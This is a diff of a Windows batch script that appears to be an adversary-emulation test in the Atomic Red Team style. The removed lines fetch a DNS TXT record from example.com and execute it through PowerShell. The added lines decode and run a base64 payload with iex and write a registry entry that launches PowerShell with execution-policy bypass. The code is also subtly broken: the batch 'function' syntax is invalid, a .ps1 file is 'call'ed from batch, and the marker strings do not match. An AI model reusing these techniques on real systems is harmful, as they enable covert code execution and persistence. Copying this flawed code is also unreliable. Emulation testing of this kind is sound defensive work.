@@ -97,19 +97,20 @@ powershell -Command "Write-Host 'Remote download of SharpHound.ps1 into memory, 
 
 
 @echo off
-setlocal enabledelayedexpansion
 
-rem Creating a custom nslookup function
-function nslookup {
-  "%windir%\system32\nslookup.exe" %* > nul
-  echo.
-  echo whoami
-}
+rem Encoded payload
+echo Set-Content -path "%SystemRoot%\Temp\art-marker.txt" -value "Hello from the Cyberange" > encoded_payload.ps1
 
-rem Using the custom nslookup function
-for /f "delims=" %%i in ('powershell -command ". (nslookup -q=txt example.com 8.8.8.8)[-1]"') do set result=%%i
-echo %result%
+rem Decoding and executing the payload
+echo $encodedPayload = "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" > decode_execute.ps1
+echo $decodedPayload = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($encodedPayload)) >> decode_execute.ps1
+echo iex $decodedPayload >> decode_execute.ps1
 
+rem Adding registry entry
+reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "@powershell -NoProfile -ExecutionPolicy Bypass -File \"%~dp0decode_execute.ps1\"" /f
+
+rem Run the batch script
+call encoded_payload.ps1
 
 
 
